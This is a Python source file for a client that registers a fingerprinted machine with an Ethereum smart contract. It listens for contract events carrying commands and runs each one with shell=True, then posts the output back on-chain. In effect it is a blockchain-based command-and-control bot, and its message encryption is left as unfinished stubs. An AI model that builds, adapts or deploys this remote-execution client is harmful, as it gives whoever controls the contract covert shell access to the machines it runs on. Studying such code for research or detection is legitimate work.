import time, sys, json, signal, shutil, atexit, yaml
from os.path import join as opj
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from web3.contract import ConciseContract
from Util.SolidityTypeConversions import *
from Util.Process import waitFor, kill_proc, runCommandSync
from Util.WalletOperations import *
from Util.EtherLogEvents import *
from Util.LogWrapper import LogWrapper
import subprocess as sp

REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
COMMAND_PENDING_EVENT_NAME = 'CommandPending'


class ClientCommands:

	def __init__(self, confFile, sessionId = None):
		conf = yaml.safe_load(open(confFile))
		self.opMode = conf['opMode']
		l.info('Working in',self.opMode,'mode')
		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		self.proc = self.runGethNode(conf)
		# connect to local node
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))
		
		if conf['opMode'] == 'privateNet':
			self.web3.admin.addPeer(conf[self.opMode]['enode'])
			peers = waitFor (lambda : self.web3.admin.peers, emptyResponse=[],pollInterval=0.1, maxRetries=10)
			assert (len(peers) > 0)
			l.info('connected peers:',self.web3.admin.peers)


		waitForNodeToSync(self.web3)

		# load contract
		self.contract = self.loadContract()
		time.sleep(5)
		self.ownerPubKey = self.contract.ownerPubKey()
		#TODO: check contract is up, otherwise go to sleep or die

		self.password = conf['clientWalletPassword']
		self.public, self.private, self.address = loadWallet(conf['clientWallet'], self.password)

		l.info("client wallet:",self.address, "contract:",self.contractAddress)
		importAccountToNode(self.web3, self.address, self.private, self.password)

		self.sessionId = sessionId
		self.gasLimit_ev = conf['gasLimit_ev']



	def loadContract(self):
		l.info('loading contract from:', self.contractAddress, self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	def registered(self):
		return self.sessionId != None

	def registerInstance(self):
		if self.registered():
			return True

		try:
			machineId = OsInteractions.fingerprintMachine()
			machineIdEnc = self.encryptMessageForServer(machineId)
			txHash = self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': self.gasLimit_ev})
			
			l.debug('registerInstance transaction executed. machineId',machineId,'txHash:',txHash)
			
			
			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
																self.contractAbi,
																self.contractAddress,
																self.web3,
																topicFilters=[self.web3.sha3(self.address)])
			
			tx = waitFor(lambda: self.web3.eth.getTransactionReceipt(txHash), emptyResponse=None, pollInterval=1, maxRetries=500)
			transactionCostLogger.insert(self.web3, txHash, 'registerInstance', len(machineId), t)
			if not tx or tx['gasUsed'] == self.gasLimit_ev:
				raise ValueError('Error in transaction execution. maximum gas used. out of gas or permission issue',tx)
			
			txs = waitFor(lambda: self.commandFilter.get(True), emptyResponse=[], pollInterval=1, maxRetries=500)
			self.web3.eth.uninstallFilter(self.commandFilter.filter_id)
			for tx in txs:
				sessionId = getLogEventArg(tx, eventABI, 'sessionId')
				self.sessionId = self.decryptMessageFromServer(sessionId)
				l.info('Successful registration! SessionId:', self.sessionId)
				
		except ValueError as e:
			raise e
		except Exception as e:
			l.error("Error in returned log event:", e)
			self.sessionId = None
			import traceback
			traceback.print_tb(e.__traceback__)

		return self.registered()


	def doWork(self, shell_cmd):
		try:
			proc = runCommandSync(shell_cmd, shell=True)
			ret = { 'status': proc.returncode,
					'output': proc.stdout.decode('utf-8', 'replace') }
		except Exception as e:
			l.error("Error in command execution:", e)
			ret = { 'status': 2,
					'output': e }
		return json.dumps(ret)

	def uploadWorkResults(self, cmdId, workResults):
		machineId = OsInteractions.fingerprintMachine()
		sessionAndMachineIdHash = sha3AsBytes(self.sessionId + machineId)
		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
		txHash = self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})
		
		l.info("sending results of cmdId",cmdId,"to server. txHash:",txHash,"result:", workResults,'...')
		transactionCostLogger.insert(self.web3, txHash, 'uploadWorkResults',len(workResults), t)
		
	def decryptMessageFromServer(self, msg, encrypt=True):
		# TODO compelete
		# if encrypt:
		# 	alice = pyelliptic.ecc()
		# 	msg = alice.encrypt(msg,self.ownerPubKey)
		return msg

	def encryptMessageForServer(self, msg, decrypt = True):
		# TODO compelete
		# if decrypt:
		# 	bob = pyelliptic.ecc()
		# 	bob.decrypt()
		return msg




	def mainLoop(self):
			sleep = 1
			while not self.registered():
				l.info('trying to register instance')
				l.info('Account Balance: ', str(getAccountBalance(self.web3, self.address)))
				success = self.registerInstance()
				if not success:
					time.sleep(sleep)
					sleep *= 2

			if self.registered():
				try:
					l.info('instance is now registered with server. waiting for work...')
					self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
										 self.contractAbi,
										 self.contractAddress,
										 self.web3,
										 topicFilters = [self.web3.sha3(self.address)])
					
					def onCommandArrival(tx):
						try:
							l.debug('new command event:',tx)
	
							command = getLogEventArg(tx, eventABI,'command')
							cmdId = getLogEventArg(tx, eventABI, 'cmdId')
	
							commandDec = self.decryptMessageFromServer(command)
							l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)
	
							workResults = self.doWork(commandDec)
							l.info('Command',cmdId, 'execution complete:', workResults[0:100],'...')
	
							workResultsEnc = self.encryptMessageForServer(workResults)
							self.uploadWorkResults(cmdId, workResultsEnc)
						except Exception as e:
							l.error("Error responding to command request:", e)
					self.commandFilter.watch(onCommandArrival)
					
				except Exception as e:
					l.error("Error in event watcher registration:", e)
					if self.commandFilter and self.commandFilter.running:
						self.commandFilter.stopWatching()



	def runGethNode(self, conf):
		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
		if (os.path.isfile(gethLockFile)):
			with open (gethLockFile) as f:
				pid = f.read()
				if (pid):
					try:
						os.kill(int(pid), signal.SIGTERM)
						time.sleep (1)
						l.debug('Old geth was running at PID:',pid,'. Killed.')
					except OSError:
						pass #all good because process wasn't running anymore

		if conf['opMode'] == 'privateNet':
			if not os.path.exists(conf[self.opMode]['genesisFile']):
				l.warning('Fresh start! removing blockchain dir ',conf['BlockChainData'])

				shutil.rmtree(conf['BlockChainData'],ignore_errors=True)

				with open(conf[self.opMode]['genesisFile'], 'w') as f:
					json.dump(conf[self.opMode]['genesis'], f, indent=1)

				l.info('Initializing blockchain...')
				gethExe = conf['geth'] + ('.exe' if os.name == 'nt' else '')
				cmd = [gethExe,'--datadir',conf['BlockChainData'],	'init',	conf[self.opMode]['genesisFile']]

				l.debug('Running geth init: ' , ' '.join(cmd))
				with open(opj('logs', 'geth.client.log'), 'a') as f:
					proc = runCommand(cmd, stdout=f)
					proc.communicate()

		l.info('Running geth node...')
		cmd = conf[self.opMode]['gethCmd']
		l.debug('Running light geth : ' , ' '.join(cmd))

		proc = runCommand(cmd, stderr=open(opj('logs', 'geth.client.log'), 'a'))

		if proc.returncode:
			std,sterr = proc.communicate()
			raise ValueError(format_error_message(
				"Error trying to run geth node",cmd,proc.returncode,std,sterr,))

		atexit.register(lambda: kill_proc(proc))

		time.sleep(1)

		with open(gethLockFile,'w') as f:
			f.write(str(proc.pid))
		l.info('Geth node running. PID:',str(proc.pid))

		return proc

if __name__ == "__main__":
	
	os.chdir(sys.argv[1])
	
	l = LogWrapper.getLogger()
	t = LogWrapper.getLogger(name='transaction', filename=opj('..','..','logs', 'transaction.log'))
	
	l.info ("base dir ",sys.argv[1])

	confFile = sys.argv[2]
	
	sessionId = sys.argv[3] if sys.argv[3] else None
	cc = ClientCommands(confFile, sessionId)

	cc.mainLoop()
	